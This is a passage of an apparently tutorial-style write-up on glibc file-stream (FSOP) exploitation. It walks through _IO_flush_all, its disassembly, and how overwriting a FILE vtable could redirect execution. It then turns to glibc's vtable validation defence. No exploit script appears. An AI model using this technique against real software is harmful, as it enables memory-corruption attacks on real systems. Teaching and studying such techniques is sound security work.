</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">_IO_funlockfile</span><span style="--0:#24292E;--1:#E1E4E8"> (fp);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">run_fp </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#ifdef</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_MTSAFE_IO</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">_IO_lock_unlock</span><span style="--0:#24292E;--1:#E1E4E8"> (list_all_lock);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">_IO_cleanup_region_end</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#endif</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> result;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">libc_hidden_def</span><span style="--0:#24292E;--1:#E1E4E8"> (_IO_flush_all)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="int_IO_flush_all (void){  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)    {      run_fp = fp;      _IO_flockfile (fp);      if (((fp->_mode <= 0 &#38;&#38; fp->_IO_write_ptr > fp->_IO_write_base)     || (_IO_vtable_offset (fp) == 0         &#38;&#38; fp->_mode > 0 &#38;&#38; (fp->_wide_data->_IO_write_ptr            > fp->_wide_data->_IO_write_base))     )    &#38;&#38; _IO_OVERFLOW (fp, EOF) == EOF)  result = EOF;      _IO_funlockfile (fp);      run_fp = NULL;    }#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;}libc_hidden_def (_IO_flush_all)"><div></div></button></div></figure></div>
<blockquote>
<p><code>_IO_list_all</code> is the head of the linked list of open file structs! <code>_IO_list_all</code> by default points to <code>stderr</code> file struct.
<code>struct _IO_FILE_plus *_IO_list_all = &amp;_IO_2_1_stderr_;</code></p>
</blockquote>
<p><code>_IO_flush_all</code> moves the file struct’s vtable to <code>rax</code> and then, dereferences <code>rax+0x18</code>.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:63ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">disas</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">_IO_flush_all</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Dump</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">of</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">assembler</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">code</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">for</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">function</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">__GI__IO_flush_all:</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c961c1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+193&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rax,QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rbx+0xd8]</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c961e3</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+227&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">call</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rax+0x18]</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> disas _IO_flush_allDump of assembler code for function __GI__IO_flush_all:...SNIP...   0x00007ffff7c961c1 <+193>:   mov    rax,QWORD PTR [rbx+0xd8]...SNIP...   0x00007ffff7c961e3 <+227>:   call   QWORD PTR [rax+0x18]...SNIP..."><div></div></button></div></figure></div>
<p>So, if we can control the vtable we could redirect execution to a place of our choice!</p>
<h3 id="stop--theres-a-vtable-gatekeeper">Stop — There’s a Vtable Gatekeeper</h3>
<p>Now, the vtable has to be within the <code>__io_vtables</code> region else the program will exit cause of a protection to this kind of attack introduced in <code>&gt;= glibc-2.24</code>:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:69ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">IO_VTABLES_LEN</span><span style="--0:#24292E;--1:#E1E4E8"> (IO_VTABLES_NUM </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">/* Perform vtable pointer validation.  If validation fails, terminate</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">   </span></span><span style="--0:#616972;--1:#99A0A6">the process.  */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">static</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">inline</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">IO_validate_vtable</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#AE4B07;--1:#FFAB70">vtable</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">uintptr_t</span><span style="--0:#24292E;--1:#E1E4E8"> ptr </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">uintptr_t</span><span style="--0:#24292E;--1:#E1E4E8">) vtable;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">uintptr_t</span><span style="--0:#24292E;--1:#E1E4E8"> offset </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ptr </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">uintptr_t</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">__io_vtables;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">__glibc_unlikely</span><span style="--0:#24292E;--1:#E1E4E8"> (offset </span><span style="--0:#BF3441;--1:#F97583">&gt;=</span><span style="--0:#24292E;--1:#E1E4E8"> IO_VTABLES_LEN))</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* The vtable pointer is not in the expected section.  Use the</span></div></div><div class="ec-line" style="--ecIndent:7ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">       </span></span><span style="--0:#616972;--1:#99A0A6">slow path, which will terminate the process if necessary.  */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">_IO_vtable_check</span><span style="--0:#24292E;--1:#E1E4E8"> ();</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> vtable;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#define IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))...SNIP.../* Perform vtable pointer validation.  If validation fails, terminate   the process.  */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){  uintptr_t ptr = (uintptr_t) vtable;  uintptr_t offset = ptr - (uintptr_t) &#38;__io_vtables;  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;}"><div></div></button></div></figure></div>
<blockquote>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L1022" rel="nofollow noreferrer noopener" target="_blank">https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L1022</a></p>
</blockquote>
<p>The <code>__io_vtables</code> is a struct defined <a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/vtables.c#L92" rel="nofollow noreferrer noopener" target="_blank">here</a>.</p>
<div class="expressive-code"><figure class="frame" style="--lnWidth:3ch"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:77ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8"> __io_vtables</span><span style="--0:#BF3441;--1:#F97583">[]</span><span style="--0:#24292E;--1:#E1E4E8"> attribute_relro </span><span style="--0:#BF3441;--1:#F97583">=</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_str_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_STR_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_str_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_str_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_wstr_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_WSTR_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_wstr_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, (</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">) _IO_wstr_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_file_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_FILE_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_file_jumps_mmap  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_FILE_JUMPS_MMAP] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_file_jumps_maybe_mmap  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_FILE_JUMPS_MAYBE_MMAP] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_wfile_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_WFILE_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_new_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, (</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">) _IO_wfile_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_wfile_jumps_mmap  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_WFILE_JUMPS_MMAP] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_new_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code"><span class="indent">    </span><span 